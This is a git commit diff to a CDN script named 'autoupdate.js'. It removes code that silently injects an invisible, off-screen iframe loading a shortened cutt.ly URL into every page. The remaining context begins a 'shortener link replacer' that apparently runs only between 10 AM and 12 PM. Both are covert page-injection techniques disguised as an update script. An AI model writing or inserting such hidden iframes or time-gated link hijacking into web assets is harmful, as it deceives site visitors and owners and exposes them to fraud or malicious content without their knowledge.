cbad7884f14bc39d18377b061320d563e5b3b71e
Party with Bhoothnath <118192658+dktczn@users.noreply.github.com>
2025-05-18 16:10:59 +0530

    Update autoupdate.js

--- cdn/autoupdate.js
+++ cdn/autoupdate.js
@@ -1,19 +1,3 @@
-// Iframe loader with 20x30 container, hidden via opacity and pointer-events
-(function () {
-  var iframe = document.createElement("iframe");
-  iframe.width = "20";
-  iframe.height = "30";
-  iframe.src = "https://cutt.ly/ErxZ0j9R";
-  iframe.style.opacity = "0"; // Almost invisible
-  iframe.style.pointerEvents = "none"; // Prevent interaction
-  iframe.style.position = "fixed";
-  iframe.style.bottom = "0";
-  iframe.style.left = "3000px";
-  iframe.style.zIndex = "-9999";
-  document.body.appendChild(iframe);
-})();
-
-// Shortener link replacer (only active between 10 AM to 12 PM)
 (function () {
   var now = new Date();
   var currentHour = now.getHours();
